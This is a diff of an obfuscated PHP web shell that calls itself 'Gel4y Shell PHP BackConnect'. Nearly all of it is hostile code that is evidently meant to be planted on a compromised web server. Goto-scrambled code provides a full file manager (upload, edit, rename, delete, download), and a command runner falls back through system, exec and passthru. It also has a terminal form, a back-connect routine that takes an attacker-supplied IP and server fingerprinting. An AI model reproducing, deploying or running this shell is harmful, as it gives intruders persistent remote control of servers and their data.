+$TQjF6JN0Xn = $_FILES['f']['name'];
+goto EY59hEhqcL;
+PigAhONo2f:
+?></textarea>
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button>
+</div>
+</form>
+<?php
+goto LVUXJeDOyh;
+AUao0i22oH:
+echo "?l=" . RXefBN6HEY($EEfZ6TZDdb, 0) . "&a=" . RXEfBn6hey("cfile", 0);
+goto EY2Ff1XUeK;
+Ms3mPsNEFz:
+y8tasQLJHv:
+goto b2f2v54QKI;
+Vdz113nHJZ:
+goto ZBWF6RSxh7;
+goto JxeppvOhkj;
+DnMdqAJ3M9:
+ewlVh3jO7D:
+goto pMoCy2S2fT;
+C3NQH6jga4:
+echo FmHaNw7Sd4;
+goto IWDRDymnkm;
+TTVVoj2zH2:
+$TkCbW35AQi = $_POST['ip'];
+goto Fhxj0LxAwC;
+DsIF5JU9Pz:
+if (!in_array($Dbi_h94n09[$IKiphkRa67], $jzgT5WmvBi)) {
+goto eCbgD8Xa7G;
+}
+goto DMDVAvNxme;
+uTadf7sHfn:
+ZBWF6RSxh7:
+goto D8pLysu5hH;
+jzLW7LC1KZ:
+if (!isset($_GET["a"])) {
+goto vpkSwTQo6s;
+}
+goto dKtG97l82G;
+D8pLysu5hH:
+?>
+</div>
+<?php
+goto cVnxCLLc0W;
+DYX5ofDNkJ:
+HmX9zWMF6z:
+goto jt5neMFYv3;
+P3l6Ot_Nq2:
+?>
+<h5>New file</h5>
+<form method="post">
+<div class="form-group">
+<label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt">
+</div>
+<div class="form-group">
+<label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea>
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
+</div>
+</form>
+<?php
+goto tRwrGXooF4;
+aEJlf18Qtu:
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta name="theme-color" content="red">
-  <meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
-  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
-  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-  <title></title>
-  <style>
-    body {
-      color: #fff;
-      font-family: serif;
-      background-color: #000;
-    }
-    a, a:hover, pre {
-      color: #fff;
-    }
-    .table-hover tbody tr:hover td{background:red}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}
-    .form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}
-  </style>
-  <script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+<meta name="theme-color" content="red">
+<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<title></title>
+<style>
+body {
+color: #fff;
+font-family: serif;
+background-color: #000;
+}
+a, a:hover, pre {
+color: #fff;
+}
+.table-hover tbody tr:hover td {
+background: red
+}
+
+.table-hover tbody tr:hover td>* {
+color: #fff
+}
+
+.table>tbody>tr>* {
+color: #fff;
+vertical-align: middle
+}
+.form-control {
+background: 0 0!important;
+color: #fff!important;
+border-radius: 0
+}
+
+.form-control::placeholder {
+color: #fff;
+opacity: 1
+}
+</style>
+<script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
 </head>
 <body>
-  <main class="my-1">
-    <div class="border bg-dark px-1">
-      <div class="d-flex justify-content-between">
-        <div>
-          <h3 class="mt-2"><a href="?"><?php  goto uI2vWciHOE; P0yX4k6fYm: if ($gAAylQtr2x == "cfile") { goto TGbvyJ958C; } goto cRcypwIMXV; W6NY1sTvKY: ?></li>
-          <li><b>PHP Uname</b>: <?php  goto l3ix3EWzDy; Zt4_Ja_dmq: if (!file_exists($jQm7oyW4Qu)) { goto Rzfxu3cAA0; } goto juZgOCu0BF; m01do8WUWb: $elMz8LjgjN = $_POST['ip']; goto ZnAAx43Xnz; cRcypwIMXV: if ($gAAylQtr2x == "cdir") { goto fGH6sGAAdw; } goto FF3jjGmujV; sHel6mqugS: if (!isset($_FILES['f'])) { goto oH2FX19oex; } goto kJxOA4IXhJ; DtJAkM2NdT: Rzfxu3cAA0: goto FBNnUH4b7H; INSDE3e0Og: $yJTLlApkG3 = 1337; goto r7MKcqXetT; xBEic2r1ZC: X1wrvj1lS4: goto RQHxIIj1cZ; X_XgIW8VNc: $jQm7oyW4Qu = $I_lN09c7SW . '/' . scOD165Rr2($_GET["n"]); goto rTQ20f4P4n; Gjo1HTRnN2: fwrite($Fpn18PJz_d, "\n            \n{#######################################}\n            \n..:: Gel4y Shell PHP BackConnect ::..\n            \n{#######################################}\n"); goto XOFxDlRi7Q; ycQGAJ9rpW: $NsqshqwBsc = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed'); goto ejtmqujYNb; hZCBXjh5xa: ItvXrc1MPf: goto c0mwifDa50; MVg1PkuxCs: @fclose($Fpn18PJz_d); goto S2DrRYDFeJ; ZXVrkJoKku: function WVHiMb1xbO($b9mgnbRgIV, $jQm7oyW4Qu, $x4Zx03KHcZ = 1) { $BJotyYe5l6 = $x4Zx03KHcZ == 1 ? "success" : "error"; echo "<script>swal({title: \"{$BJotyYe5l6}\", text: \"{$b9mgnbRgIV}\", icon: \"{$BJotyYe5l6}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?l=" . $jQm7oyW4Qu . "\"}})</script>"; } goto Jm3tyWVk1H; jftsKZuteU: ?></li>
-        </ul>
-      </div>
-      <form method="post" enctype="multipart/form-data">
-        <div class="input-group mb-1">
-          <div class="custom-file">
-            <input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple>
-            <label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label>
-          </div>
-        </div>
-      </form>
-      <?php  goto sHel6mqugS; TyFYUmAEq5: function whagU3Zqsi($Ss4YblvGzi) { goto U6mxdQ5TPd; JESyI3I_EC: $LTbuLnsRbh = @Bc_gFRHaT7($Ss4YblvGzi); goto L69iiQ4VB_; L69iiQ4VB_: return $LTbuLnsRbh; goto tU97XVvgG4; U6mxdQ5TPd: if (function_exists('system')) { goto phhWxvNIRF; } goto GXxXqPVu_s; jT1FNETWrK: @ob_end_clean(); goto dS5nEYoTky; rGRicy91Vl: return $LTbuLnsRbh; goto rVkBtVSmf2; noUSl7OsSq: $LTbuLnsRbh = ''; goto RpI6WaRtjl; RpI6WaRtjl: foreach ($jcQuwKNUeF as $inT77z9QL1) { $LTbuLnsRbh .= $inT77z9QL1; uDF57UvBz6: } goto QE4ju5iUNX; UQ9bPiHC4u: phhWxvNIRF: goto i2yFHS8Iqv; tU97XVvgG4: jocoSWByK8: goto WdUnKBfl39; bsnW6hpeJm: ZW9__Q7wzH: goto JXoXevtdUt; i2yFHS8Iqv: @ob_start(); goto ByY3HshN_Z; djbW2ce5Q3: if (function_exists('passthru')) { goto dr3sN_wGkM; } goto bwwM_EXcJt; BBtL7fdIBh: goto jocoSWByK8; goto UQ9bPiHC4u; GXxXqPVu_s: if (function_exists('exec')) { goto ZW9__Q7wzH; } goto djbW2ce5Q3; dS5nEYoTky: return $LTbuLnsRbh; goto Y5QcT8ZnuA; dITRognc85: @ob_end_clean(); goto rGRicy91Vl; ByY3HshN_Z: @system($Ss4YblvGzi); goto GAmYuseJhh; biv3xUKYVv: return $LTbuLnsRbh; goto IkLRGFI2ab; yFWRQSSw4v: oReuh7fJSO: goto JESyI3I_EC; QE4ju5iUNX: zMRNaIbL4k: goto biv3xUKYVv; fVnhRyGVXS: @ob_start(); goto dsw340sh9W; OFlaYYZrW8: $LTbuLnsRbh = @ob_get_contents(); goto jT1FNETWrK; rVkBtVSmf2: goto jocoSWByK8; goto bsnW6hpeJm; hSzcd8AqN8: dr3sN_wGkM: goto fVnhRyGVXS; Y5QcT8ZnuA: goto jocoSWByK8; goto yFWRQSSw4v; JXoXevtdUt: @exec($Ss4YblvGzi, $jcQuwKNUeF); goto noUSl7OsSq; bwwM_EXcJt: if (function_exists('bC_GfRHAt7')) { goto oReuh7fJSO; } goto BBtL7fdIBh; dsw340sh9W: @passthru($Ss4YblvGzi); goto OFlaYYZrW8; GAmYuseJhh: $LTbuLnsRbh = @ob_get_contents(); goto dITRognc85; IkLRGFI2ab: goto jocoSWByK8; goto hSzcd8AqN8; WdUnKBfl39: } goto XDOSwg8E31; vpD6oLHWNu: echo "?l=" . SCOD165rR2($I_lN09c7SW, 0) . "&a=" . sCOD165Rr2("con", 0); goto z80W2Hg6XW; FB75EhKxg7: foreach ($RMHbuQpaGc as $hFrCwZLJYl) { goto heoLajAExY; Rx2XtCNNTJ: sLfFlee4z2: goto z6VE34T7ce; ehxlyK7y53: goto zYWOjVqkGE; goto Rx2XtCNNTJ; oSSQtogwMt: zYWOjVqkGE: goto sYjYjilZgD; yRtHb89pwU: $yARdv6rR_v = $yARdv6rR_v > 1024 ? round($yARdv6rR_v / 1024, 2) . "MB" : $yARdv6rR_v . "KB"; goto cm_Gp31QO8; heoLajAExY: if (is_file("{$I_lN09c7SW}/{$hFrCwZLJYl}")) { goto sLfFlee4z2; } goto ehxlyK7y53; VLAGD1LAK2: $yARdv6rR_v = round($yARdv6rR_v, 3); goto yRtHb89pwU; cm_Gp31QO8: echo "<tr>\n\t        <td><a href=\"?l=" . scOD165RR2($I_lN09c7SW, 0) . "&a=" . scoD165Rr2("view", 0) . "&n=" . Scod165rR2($hFrCwZLJYl, 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . date("Y-m-d H:i", filemtime("{$I_lN09c7SW}/{$hFrCwZLJYl}")) . "\"><i class=\"fa fa-fw fa-file" . ($_SERVER["SCRIPT_FILENAME"] == "{$I_lN09c7SW}/{$hFrCwZLJYl}" ? " text-danger" : "") . "\"></i> {$hFrCwZLJYl}</a></td>\n\t        <td>{$yARdv6rR_v}</td>\n\t        <td><font color=\"" . (is_writable("{$I_lN09c7SW}/{$hFrCwZLJYl}") ? "#00ff00" : (!is_readable("{$I_lN09c7SW}/{$hFrCwZLJYl}") ? "red" : null)) . "\">" . u9tuCK4i9Z("{$I_lN09c7SW}/{$hFrCwZLJYl}") . "</font></td>\n\t        <td>\n\t          <div class=\"d-flex justify-content-between\">\n\t            <a href=\"?l=" . Scod165Rr2($I_lN09c7SW, 0) . "&a=" . scoD165Rr2("edit", 0) . "&n=" . ScoD165rr2($hFrCwZLJYl, 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a>\n\t            <a href=\"?l=" . SCoD165rR2($I_lN09c7SW, 0) . "&a=" . scod165rr2("rename", 0) . "&n=" . ScOD165RR2($hFrCwZLJYl, 0) . "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t            <a href=\"?l=" . sCOD165rR2($I_lN09c7SW, 0) . "&n=" . scOD165rr2($hFrCwZLJYl, 0) . "&download" . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a>\n\t            <a href=\"?l=" . sCOd165rr2($I_lN09c7SW, 0) . "&a=" . ScOd165rR2("delete", 0) . "&n=" . Scod165rR2($hFrCwZLJYl, 0) . "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t          </div>\n\t        </td></tr>"; goto oSSQtogwMt; z6VE34T7ce: $yARdv6rR_v = filesize("{$I_lN09c7SW}/{$hFrCwZLJYl}") / 1024; goto VLAGD1LAK2; sYjYjilZgD: } goto Z9dkzv793z; LwTnKrb2gA: if (feof($Fpn18PJz_d)) { goto F0xQFfn0VO; } goto jMPcNRaZis; SVaW0fhIwN: fDUZVEdq_w: goto DeFTIAbO1U; Y4EsMEyH4O: rbFg1GuGUf: goto FB75EhKxg7; T1UBhoC41_: goto F5zzwsOrwM; goto pcpGqYKxIS; QSZBpPfN28: goto F5zzwsOrwM; goto bcf0qyytlE; KneIt5lbcF: $RMHbuQpaGc = array_diff(scandir($I_lN09c7SW), ['.', '..']); goto TRpQwGgb1c; mFN0sccJhQ: $fIPtHB3t1c = $RFJjcUG5Gt->open($hNee7BwYVM[$vjeKX6vmt9]); goto VdQSvY5A71; o_dxl30q83: $OiNrDTOvfr = $_FILES['f']['tmp_name']; goto fZPMa7C5AR; gG13wzHgsR: F5zzwsOrwM: goto ysxCc13A4L; hThw1FAitG: echo sCOd165RR2($_GET["n"]); goto Hgp6UtYbMT; LWpw7tFZAk: goto F5zzwsOrwM; goto yf2aassheI; cbhOJULWP6: goto SxcAwFEBKX; goto ur1ttufF6K; KlOPnfptF3: yJvJoa_rQx: goto yzMyxB0XOO; oHjPWHLCJ8: ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
-    <?php  goto PpySlVoutO; nsN5CW5xgv: ?>
-    <h5>New folder</h5>
-    <form method="post">
-      <div class="form-group">
-        <label for="n">Name :</label>
-        <input name="n" id="n" class="form-control" autocomplete="off">
-      </div>
-      <div class="form-group">
-        <button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
-      </div>
-    </form>
-    <?php  goto yu0QvRDrXG; Pqd0zB58gx: ?></pre>
-    <form method="post">
-      <div class="form-group">
-        <input type="text" name="cmd" class="form-control">
-      </div>
-    </form>
-    <?php  goto AfOhj0UgbP; hGz8UR6V9v: ?></h5>
-    <form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?php  goto NrpEZw4RKK; NOPki1VPRd: ?>
-    <div class="px-2 py-2">
-    <?php  goto zEi70zkzTd; uP3nEDF0Tt: if (!($_GET["t"] == "f")) { goto fqbjkF8tFG; } goto X_XgIW8VNc; ySJeKYveVV: wVHimB1XbO("folder deleted successfully", sCOd165rr2($I_lN09c7SW, 0)); goto p9xJ2f65AM; Ck6ClCfjRc: header("Content-Length: " . strtotime(SCoD165Rr2($_GET["n"]))); goto maVTuLjvor; F3VcebjEGw: ?>"><i class="fa fa-terminal"></i></a>
-        </div>
-      </div>
-      <div class="border-top">
-        <ul style="list-style:none;" class="m-0 p-0">
-          <li><b>Server</b>: <?php  goto t4YglQhiE5; GOA9daq_pY: ?></a></h3>
-        </div>
-        <div>
-          <span>PHP Version: <?php  goto ns9M42YdZd; aABsteA3B5: ?>
-    <?php  goto jh7n6eL6pb; qpvqDxlak2: goto DWkF8CvIH0; goto o9PS4uYfjH; yzMyxB0XOO: echo "<font color='red'>{$CwSBQX1tlw} : {$q5jUdzyF0Y}</font>"; goto cbhOJULWP6; NrpEZw4RKK: echo scoD165Rr2($_GET["n"]); goto fZMgVZhTUw; JIkdCXtH17: goto F5zzwsOrwM; goto Py0dYxgwSI; stOOeE0nH7: KdWNo7AjqV: goto CjHzdcIpw4; juZgOCu0BF: wvHimB1XBO("file to delete the folder", scod165rr2($I_lN09c7SW, 0), 0); goto tf_GYYPDNs; ejtmqujYNb: if (move_uploaded_file($OiNrDTOvfr[$vjeKX6vmt9], $hNee7BwYVM[$vjeKX6vmt9])) { goto c8u9XhYh_Q; } goto OeI0AYCWg5; E26lalF_uA: @fwrite($Fpn18PJz_d, $h4rnlsdP_W); goto lHTV2LHwsZ; eqMjYxDM2L: WVhImb1xBO("failed to delete the folder", SCOd165Rr2($I_lN09c7SW, 0), 0); goto lebg1dTG9A; io3g_1iEKc: ?>
-    </div>
-    <div class="border bg-dark my-2 py-2 table-responsive">
-      <div class="mx-2">
-        <span>Path:</span>
-        <?php  goto rOBq0oetEF; V3sYxh3Ino: if (!($_GET["t"] == "d")) { goto H5yuZJRAjS; } goto UE8pM5OTuV; PpySlVoutO: isset($_POST["s"]) ? file_put_contents($I_lN09c7SW . '/' . ScOD165Rr2($_GET["n"]), $_POST["ctn"]) ? wvhImb1XBo("file contents changed successfully", ScOD165rr2($I_lN09c7SW, 0) . "&a=" . sCOd165RR2("view", 0) . "&n={$_GET["n"]}") : wvHIMB1xbO("file contents failed to change", ScoD165rr2($I_lN09c7SW, 0), 0) : null; goto vtO6Mte_uT; l3ix3EWzDy: echo php_uname(); goto jftsKZuteU; ArTvBhfEnl: ?>
-    <h5>New file</h5>
-    <form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
-    <?php  goto qTOgQRiQRf; DeFTIAbO1U: ?>
-    <table class="table table-hover table-borderless table-sm">
-      <thead class="text-light">
-        <tr>
-          <th>Name</th>
-          <th>Size</th>
-          <th>Permission</th>
-          <th>Action</th>
-        </tr>
-      </thead>
-      <tbody>
-        <?php  goto KneIt5lbcF; VdQSvY5A71: if (!($fIPtHB3t1c == true)) { goto X1wrvj1lS4; } goto ZoGfj_hn2i; sNH2AjSsc9: N2NcOymve_: goto aABsteA3B5; IXOP4R0rfy: DWkF8CvIH0: goto ueI6__rUxY; QwV5y1setZ: $RFJjcUG5Gt->close(); goto xBEic2r1ZC; X5vp9ETlF5: ZgCoZJOFL9: goto YPRTSligfx; l8CXKFCE3N: if (!($vjeKX6vmt9 < count($hNee7BwYVM))) { goto Z1BIxeEn0_; } goto o_dxl30q83; T0ShNahMsS: NpedkrNY5l: goto v0RE2SAi9i; XRfaw0lEpa: Z1BIxeEn0_: goto vdGkISEprn; ZDyElMZQmF: $vjeKX6vmt9++; goto BrCC99QmZj; bcf0qyytlE: fGH6sGAAdw: goto nsN5CW5xgv; Py0dYxgwSI: X94ON33i95: goto sGExma8iO7; a4ylo9zyoS: $s1OVK9lbWK = WHaGu3ZQSi('uname -a'); goto lYWHG190jR; jh7n6eL6pb: goto P3Hi2iwd1U; goto SVaW0fhIwN; l0VEWWoryp: chdir($I_lN09c7SW); goto nx4H_osQzp; hMS8V72NkH: echo '<div class="my-3">'; goto m01do8WUWb; sGExma8iO7: ?>
-    <h5>View file</h5>
-<span>File name : <?php  goto imEup2KTzo; q7NlNU9F79: echo "?l=" . SCoD165rR2($I_lN09c7SW, 0) . "&a=" . SCoD165rr2("cdir", 0); goto FMHj1HdkPm; qPfS3LOdmn: D5xQkaqN6L: goto oQBmms1zYb; yf2aassheI: XToGaMZfBf: goto mox6qQiktB; Yy5ei4krjv: echo "?l=" . scOD165rR2($I_lN09c7SW, 0) . "&a=" . Scod165rr2("term", 0); goto F3VcebjEGw; vdGkISEprn: oH2FX19oex: goto FK22nGHGLF; TRpQwGgb1c: foreach ($RMHbuQpaGc as $UA2QAI9Aou) { goto L0ayjvSovq; ERdGOXGkAf: LaY6MXRjkT: goto HieoR4KTFa; abdnXLW_KC: goto LaY6MXRjkT; goto jyd23QrDlk; L0ayjvSovq: if (is_dir("{$I_lN09c7SW}/{$UA2QAI9Aou}")) { goto rrIlsajR1W; } goto abdnXLW_KC; ifRBwVPhw1: echo "<tr>\n          <td><a href=\"?l=" . SCoD165rR2("{$I_lN09c7SW}/{$UA2QAI9Aou}", 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . date("Y-m-d H:i", filemtime("{$I_lN09c7SW}/{$UA2QAI9Aou}")) . "\"><i class=\"fa fa-fw fa-folder" . (count(scandir("{$I_lN09c7SW}/{$UA2QAI9Aou}")) == 0 ? "" : "-open") . " text-warning\"></i> {$UA2QAI9Aou}</a></td>\n          <td>N/A</td>\n          <td><font color=\"" . (is_writable("{$I_lN09c7SW}/{$UA2QAI9Aou}") ? "#00ff00" : (!is_readable("{$I_lN09c7SW}/{$UA2QAI9Aou}") ? "red" : null)) . "\">" . u9TucK4I9z("{$I_lN09c7SW}/{$UA2QAI9Aou}") . "</font></td>\n          <td>\n            <a href=\"?l=" . sCod165rr2($I_lN09c7SW, 0) . "&a=" . SCod165Rr2("rename", 0) . "&n=" . SCoD165Rr2($UA2QAI9Aou, 0) . "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n            <a href=\"?l=" . scoD165Rr2($I_lN09c7SW, 0) . "&a=" . SCOd165RR2("delete", 0) . "&n=" . ScOD165rr2($UA2QAI9Aou, 0) . "&t=f\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n          </td></tr>"; goto ERdGOXGkAf; jyd23QrDlk: rrIlsajR1W: goto ifRBwVPhw1; HieoR4KTFa: } goto Y4EsMEyH4O; LuWToMYtnr: echo "?l=" . sCOd165RR2($I_lN09c7SW, 0) . "&a=" . SCOd165RR2("cfile", 0); goto VjwIX64Qky; m8SfLGjd02: KQLt0D0U6k: goto l8CXKFCE3N; GR4PSTwJoi: header("Content-Transfer-Encoding: Binary"); goto Ck6ClCfjRc; hRufaLMoAj: $jQm7oyW4Qu = $I_lN09c7SW . '/' . ScOd165rr2($_GET["n"]); goto V3sYxh3Ino; Ym92vxFdSr: ?></span><br>
-          <a href="<?php  goto q7NlNU9F79; tB9vZK2Qir: $inT77z9QL1 = '<p>Unexpected error has occured, connection may have failed.</p>'; goto kfkPETDaAp; H4JBzu3vyj: echo $_GET["t"] == "d" ? "folder" : "file"; goto hGz8UR6V9v; ocXYZDbAyt: goto Dz60W6jbh8; goto qPfS3LOdmn; tU5C63PXNZ: function xbsgNP_QMX($HF0evh8iOX) { goto kZ6qbKTOZ5; kZ6qbKTOZ5: global $tJbmOZcmje; goto ftjNicQIjz; lPHNcxbDBh: array_map("deldir", glob($HF0evh8iOX . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT)); goto rU4A15hHLH; rU4A15hHLH: rmdir($HF0evh8iOX); goto iK56GFa3qQ; gotERXWQII: unlink($HF0evh8iOX); goto TRsGLJfDzE; GBaFc0yEFP: N9mP70HlHk: goto lPHNcxbDBh; seylOLweF5: return; goto bI7yq28KhO; bI7yq28KhO: M50KzLXPQc: goto jRpNRnRWbs; ftjNicQIjz: if (!(trim(pathinfo($HF0evh8iOX, PATHINFO_BASENAME), '.') === '')) { goto M50KzLXPQc; } goto seylOLweF5; iK56GFa3qQ: L2FMvOhNzO: goto BUZZp0TrYF; TRsGLJfDzE: goto L2FMvOhNzO; goto GBaFc0yEFP; jRpNRnRWbs: if (is_dir($HF0evh8iOX)) { goto N9mP70HlHk; } goto gotERXWQII; BUZZp0TrYF: } goto OWUVT5Hc5g; XDOSwg8E31: function u9tUCK4i9z($hFrCwZLJYl) { goto GfYAi9YNmw; DG2loZcIWT: $wrNsc8er0i .= $QZSHwhng7j & 0x4 ? 'r' : '-'; goto Kqq0A_wMV6; GfYAi9YNmw: $QZSHwhng7j = fileperms($hFrCwZLJYl); goto xgFDlpTnQ1; jivVJwLLs_: $wrNsc8er0i .= $QZSHwhng7j & 0x40 ? $QZSHwhng7j & 0x800 ? 's' : 'x' : ($QZSHwhng7j & 0x800 ? 'S' : '-'); goto R0SA0EiELb; S3TdyC_2GB: return $wrNsc8er0i; goto klvZO9R17b; Kqq0A_wMV6: $wrNsc8er0i .= $QZSHwhng7j & 0x2 ? 'w' : '-'; goto BAGMOedk1X; WZ1QGc4In8: ZeBKvbOjfC: goto HF31vbbcb5; eN1SwHWluT: $wrNsc8er0i .= $QZSHwhng7j & 0x10 ? 'w' : '-'; goto tpW5TkUBMh; SbU1fRcbbF: $wrNsc8er0i .= $QZSHwhng7j & 0x80 ? 'w' : '-'; goto jivVJwLLs_; R0SA0EiELb: $wrNsc8er0i .= $QZSHwhng7j & 0x20 ? 'r' : '-'; goto eN1SwHWluT; tpW5TkUBMh: $wrNsc8er0i .= $QZSHwhng7j & 0x8 ? $QZSHwhng7j & 0x400 ? 's' : 'x' : ($QZSHwhng7j & 0x400 ? 'S' : '-'); goto DG2loZcIWT; xgFDlpTnQ1: switch ($QZSHwhng7j & 0xf000) { case 0xc000: $wrNsc8er0i = 's'; goto ZeBKvbOjfC; case 0xa000: $wrNsc8er0i = 'l'; goto ZeBKvbOjfC; case 0x8000: $wrNsc8er0i = '-'; goto ZeBKvbOjfC; case 0x6000: $wrNsc8er0i = 'b'; goto ZeBKvbOjfC; case 0x4000: $wrNsc8er0i = 'd'; goto ZeBKvbOjfC; case 0x2000: $wrNsc8er0i = 'c'; goto ZeBKvbOjfC; case 0x1000: $wrNsc8er0i = 'p'; goto ZeBKvbOjfC; default: $wrNsc8er0i = 'u'; } goto PyvgJMDIGx; PyvgJMDIGx: nvhdxhLUN_: goto WZ1QGc4In8; BAGMOedk1X: $wrNsc8er0i .= $QZSHwhng7j & 0x1 ? $QZSHwhng7j & 0x200 ? 't' : 'x' : ($QZSHwhng7j & 0x200 ? 'T' : '-'); goto S3TdyC_2GB; HF31vbbcb5: $wrNsc8er0i .= $QZSHwhng7j & 0x100 ? 'r' : '-'; goto SbU1fRcbbF; klvZO9R17b: } goto tU5C63PXNZ; p9xJ2f65AM: ORqp0RHsir: goto d56bXPkOvG; jMPcNRaZis: $h4rnlsdP_W = '[gel4y]#:> '; goto E26lalF_uA; r1bYIhfphm: TGbvyJ958C: goto ArTvBhfEnl; xRWajGhsvU: qxwiPIxTUE: goto io3g_1iEKc; LEdsfT_f5L: ?>" class="form-control">
+<main class="my-1">
+<div class="border bg-dark px-1">
+<div class="d-flex justify-content-between">
+<div>
+<h3 class="mt-2"><a href="?"><?php
+goto C3NQH6jga4;
+LcspiVxgnz:
+function hrXkAttUKJ($rn5LpfN5ed) {
+goto Llxlo5JLmV;
+VI4smubLWC:
+switch ($q_apefxuXb & 0xf000) {
+case 0xc000:
+$pEiaUOtN6B = 's';
+goto KaLTMLFLZ8;
+case 0xa000:
+$pEiaUOtN6B = 'l';
+goto KaLTMLFLZ8;
+case 0x8000:
+$pEiaUOtN6B = '-';
+goto KaLTMLFLZ8;
+case 0x6000:
+$pEiaUOtN6B = 'b';
+goto KaLTMLFLZ8;
+case 0x4000:
+$pEiaUOtN6B = 'd';
+goto KaLTMLFLZ8;
+case 0x2000:
+$pEiaUOtN6B = 'c';
+goto KaLTMLFLZ8;
+case 0x1000:
+$pEiaUOtN6B = 'p';
+goto KaLTMLFLZ8;
+default:
+$pEiaUOtN6B = 'u';
+}
+goto viwKXWVlCm;
+BuDpmu4Dpa:
+$pEiaUOtN6B .= $q_apefxuXb & 0x2 ? 'w' : '-';
+goto oSsnbfMX7N;
+RHtymoOkRA:
+$pEiaUOtN6B .= $q_apefxuXb & 0x80 ? 'w' : '-';
+goto qaVIp_1poQ;
+Llxlo5JLmV:
+$q_apefxuXb = fileperms($rn5LpfN5ed);
+goto VI4smubLWC;
+iehULJc3F2:
+$pEiaUOtN6B .= $q_apefxuXb & 0x100 ? 'r' : '-';
+goto RHtymoOkRA;
+viwKXWVlCm:
+U0bpzZFP8o:
+goto HLfsKw9eD9;
+oSsnbfMX7N:
+$pEiaUOtN6B .= $q_apefxuXb & 0x1 ? $q_apefxuXb & 0x200 ? 't' : 'x' : ($q_apefxuXb & 0x200 ? 'T' : '-');
+goto Izs_QCpKLv;
+PSoRY6eJEK:
+$pEiaUOtN6B .= $q_apefxuXb & 0x10 ? 'w' : '-';
+goto BYUFnpD5Kl;
+WU_ISBG1Cd:
+$pEiaUOtN6B .= $q_apefxuXb & 0x4 ? 'r' : '-';
+goto BuDpmu4Dpa;
+HLfsKw9eD9:
+KaLTMLFLZ8:
+goto iehULJc3F2;
+Izs_QCpKLv:
+return $pEiaUOtN6B;
+goto Wym9usKGF4;
+qaVIp_1poQ:
+$pEiaUOtN6B .= $q_apefxuXb & 0x40 ? $q_apefxuXb & 0x800 ? 's' : 'x' : ($q_apefxuXb & 0x800 ? 'S' : '-');
+goto gCMWKc7Qi2;
+gCMWKc7Qi2:
+$pEiaUOtN6B .= $q_apefxuXb & 0x20 ? 'r' : '-';
+goto PSoRY6eJEK;
+BYUFnpD5Kl:
+$pEiaUOtN6B .= $q_apefxuXb & 0x8 ? $q_apefxuXb & 0x400 ? 's' : 'x' : ($q_apefxuXb & 0x400 ? 'S' : '-');
+goto WU_ISBG1Cd;
+Wym9usKGF4:
+}
+goto fhYGKduull;
+TnhMIgmoXz:
+if (!isset($_GET["a"])) {
+goto oC49Ak4Qpk;
+}
+goto jzLW7LC1KZ;
+d6E_B1kiXH:
+if ($hzOvuJeFzz == 'edit') {
+goto NetExxORKl;
+}
+goto JaRFY01HAP;
+AxYV08ef23:
+chdir($EEfZ6TZDdb);
+goto e1DVBPK5MZ;
+iiqLupTD75:
+?>"><i class="fa fa-plus"></i><i class="fa fa-folder"></i></a> |
+<a href="<?php
+goto AUao0i22oH;
+gQ0uxJM3IM:
+?>
+<?php
+goto uED_zyRYat;
+feaBlZ7eEU:
+kMsRr8KO2i:
+goto GBMZg5FNn5;
+uED_zyRYat:
+if ($hzOvuJeFzz == "con") {
+goto mqgxd0ffd7;
+}
+goto n6KlS76u_Y;
+hlAdt5ocAO:
+goto pXxft1wW2P;
+goto gtEtp66eA1;
+Xzf4iJyVK1:
+goto ZBWF6RSxh7;
